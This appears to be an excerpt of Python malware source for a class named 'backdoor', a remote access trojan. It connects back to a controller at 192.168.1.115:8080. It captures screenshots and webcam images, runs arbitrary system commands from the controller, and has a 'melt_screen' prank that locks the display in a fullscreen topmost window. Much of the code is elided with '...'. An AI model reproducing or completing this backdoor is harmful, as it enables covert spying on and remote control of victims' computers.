...
class backdoor:
    try:
        ...
        UPLOADING_SFX_PATH = os.path.join(USER_PROFILE, "Music.wav")        
        SCREEN_MELTDOWN_PRANK = "Window"

        is_melting_screen = False
        tm_enabled = True
    except Exception:
        pass
    ...
    def get_screenshot(self):
        try:
            ...
            path = os.path.join(self.USER_PROFILE, "Screenshot{}{}{}.png".format(current_time.year, current_time.month, current_time.day))
    ...
    def get_webcam_snap(self):
        try:
            ...
            current_time = datetime.datetime.now()
            path = os.path.join(self.USER_PROFILE, "Webcam{}{}{}.png".format(current_time.year, current_time.month, current_time.day))
    ...
    def melt_screen(self):
        try:
            if not self.is_melting_screen:
                self.is_melting_screen = True
                cv2.waitKey(2000)
                ...
                cv2.namedWindow(self.SCREEN_MELTDOWN_PRANK, cv2.WND_PROP_FULLSCREEN)
                cv2.setWindowProperty(self.SCREEN_MELTDOWN_PRANK, cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
                cv2.setWindowProperty(self.SCREEN_MELTDOWN_PRANK, cv2.WND_PROP_TOPMOST, cv2.WND_PROP_TOPMOST)
                cv2.setMouseCallback(self.SCREEN_MELTDOWN_PRANK, self.mouse_evt)
                cv2.imshow(self.SCREEN_MELTDOWN_PRANK, image)
                ...
                self.is_melting_screen = False
                cv2.destroyAllWindows()

                return "[+] Successfully stopped the melting of the Screen."

        except Exception as e:
            return "[-] Couldn't prank the User by melting screen, {}.".format(e)
        ...
        while True:
            ...
            try:
                ...
                if len(rest_of_command) == 0:       # Commands with no arguments
                    ...
                    elif command_0 == "melt_screen":
                        command_result = self.melt_screen()
                    else:       # System command
...
my_backdoor = backdoor("192.168.1.115", 8080)
my_backdoor.run()
